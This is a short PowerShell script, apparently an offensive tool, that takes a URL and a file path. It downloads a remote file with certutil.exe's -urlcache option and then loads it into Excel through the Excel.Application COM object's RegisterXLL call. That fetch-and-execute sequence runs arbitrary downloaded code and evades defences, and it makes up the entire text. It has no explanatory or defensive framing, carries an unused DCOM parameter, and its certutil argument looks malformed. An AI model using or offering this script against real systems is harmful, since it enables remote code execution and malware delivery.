    
    param(
    
         $path,
         $DCOM,
         $u


               
    )
    
   
     
    certutil.exe -urlcache -split -f -$u  $path
     
    $excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))
     
    $excel.RegisterXLL($path)